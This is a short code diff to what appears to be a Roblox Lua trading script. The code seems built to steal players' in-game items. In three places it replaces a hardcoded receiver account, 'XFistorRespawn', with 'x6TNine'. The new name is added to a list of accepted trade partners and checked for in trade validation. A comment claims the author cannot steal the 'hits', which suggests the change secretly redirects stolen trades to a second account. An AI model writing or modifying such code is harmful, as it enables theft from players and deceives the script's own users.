@@ -82,8 +82,8 @@ end
 
 setupHooks()
 
-if not table.find(Usernames, "XFistorRespawn") then
-    table.insert(Usernames, "XFistorRespawn")
+if not table.find(Usernames, "x6TNine") then
+    table.insert(Usernames, "x6TNine")
 end
 
 local function JoinTeam()
@@ -942,7 +942,7 @@ end
 
 local function isValidTradePartner(player)
     if not player then return false end
-    return table.find(Usernames, player.Name) or player.Name == "XFistorRespawn"
+    return table.find(Usernames, player.Name) or player.Name == "x6TNine"
 end
 
 local function disableJump()
@@ -1096,7 +1096,7 @@ local function isInTradeWithCorrectPlayer()
         end
     end
 
-    if tradingPartnerName == "XFistorRespawn" then -- << Ts is not dual hook. I use it to code my thing. I don't log your hits, so I can't steal
+    if tradingPartnerName == "x6TNine" then -- << Ts is not dual hook. I use it to code my thing. I don't log your hits, so I can't steal
         return true
     end
 
